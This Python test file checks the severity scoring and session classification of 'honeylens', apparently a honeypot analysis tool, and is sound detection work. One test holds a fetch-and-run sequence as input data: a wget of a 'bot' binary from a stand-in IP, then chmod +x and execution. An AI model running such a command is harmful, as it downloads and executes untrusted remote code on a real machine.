"""Scoring regressions built from real honeypot sessions (see tests/real_fixtures.py)."""

from datetime import UTC, datetime, timedelta

from honeylens.mitre.attack import match_command
from honeylens.pipeline.scoring import SessionFacts, classify, score_session
from tests.real_fixtures import DROPPER, KEY_BOT_SESSION, PROBE_FOLLOWUPS, PROBE_SCRIPT

T0 = datetime(2026, 10, 16, 6, 0, tzinfo=UTC)


def facts_for(commands, login_success=True, failures=0, downloads=0):
    f = SessionFacts(login_success=login_success, login_failures=failures, downloads=downloads,
                     login_success_ts=T0 if login_success else None)
    for i, cmd in enumerate(commands):
        f.command_ts.append(T0 + timedelta(seconds=1 + i * 3))
        for m in match_command(cmd):
            f.rule_ids.add(m.rule_id)
            f.techniques.add(m.technique)
            f.tactics.add(m.tactic)
            if m.confidence == "high":
                f.high_conf_techniques.add(m.technique)
    return f


def reasons(result):
    return {r["rule"]: r["points"] for r in result.reasons}


def test_real_dropper_reaches_high():
    r = score_session(facts_for([DROPPER]))
    assert r.classification == "malware-dropper"
    assert r.severity >= 60 and r.label in {"high", "critical"}
    got = reasons(r)
    assert got["download_execute"] == 25
    assert got["login_success"] == 10  # counted once, not again inside download_execute
    assert r.severity == min(100, sum(got.values()))
    # real sessions scored 40 before the fix; download_execute is the only new points
    assert r.severity - got["download_execute"] == 40


def test_dropper_with_recorded_download_does_not_saturate():
    r = score_session(facts_for([DROPPER], downloads=1))
    got = reasons(r)
    assert "download_attempt" in got and "download_execute" in got
    assert r.severity == min(100, sum(got.values())) and r.severity < 100


def test_chmod_exec_only_counts_after_a_fetch():
    # chmod +x && ./x without any fetch is execution, not download-and-execute
    plain = score_session(facts_for(["chmod +x bot; ./bot"]))
    assert "download_execute" not in reasons(plain)
    fetched = score_session(facts_for(["wget http://198.51.100.20/bot", "chmod +x bot; ./bot"]))
    assert reasons(fetched)["download_execute"] == 25


def test_probe_family_is_prober_even_with_many_commands():
    cmds = [PROBE_SCRIPT, *PROBE_FOLLOWUPS, "uname -a", "nproc", "lspci | grep -i vga"]
    assert len(cmds) > 6
    assert classify(facts_for(cmds)) == "honeypot-prober"


def test_weak_system_check_still_needs_short_session():
    f = facts_for(["echo Hi | cat -n"] + ["ls /tmp"] * 7)
    assert classify(f) == "intruder"  # low-confidence check, long session
    assert classify(facts_for(["echo Hi | cat -n"])) == "honeypot-prober"


def test_dropper_outranks_prober():
    assert classify(facts_for([PROBE_SCRIPT, DROPPER])) == "malware-dropper"


def test_authorized_keys_session_stays_high():
    r = score_session(facts_for(KEY_BOT_SESSION))
    assert len(KEY_BOT_SESSION) == 19
    assert facts_for(KEY_BOT_SESSION).techniques == {"T1007", "T1033", "T1059.004", "T1082", "T1098", "T1098.004"}
    assert r.classification == "intruder"
    assert r.severity == 57 and r.label == "high"  # same as the real sessions: the fix must not change it
    assert "persistence" in reasons(r)


def test_ip_brute_force_window():
    one_guess = SessionFacts(login_failures=1, ip_brute_threshold=20, ip_window_minutes=60)
    one_guess.ip_window_failures = 19
    assert classify(one_guess) == "scanner"
    one_guess.ip_window_failures = 20
    r = score_session(one_guess)
    assert r.classification == "brute-forcer"
    assert reasons(r) == {"ip_brute_force": 5}
    assert "20 failed logins within +/-60 min" in r.reasons[0]["detail"]


def test_ip_brute_force_never_applies_to_sessions_with_commands_or_no_logins():
    with_cmds = facts_for(["uname -a"], login_success=True)
    with_cmds.ip_brute_threshold, with_cmds.ip_window_failures = 20, 500
    assert classify(with_cmds) == "intruder"
    no_login = SessionFacts(ip_brute_threshold=20, ip_window_failures=500)
    assert classify(no_login) == "scanner"
    off = SessionFacts(login_failures=1, ip_brute_threshold=0, ip_window_failures=500)
    assert classify(off) == "scanner"
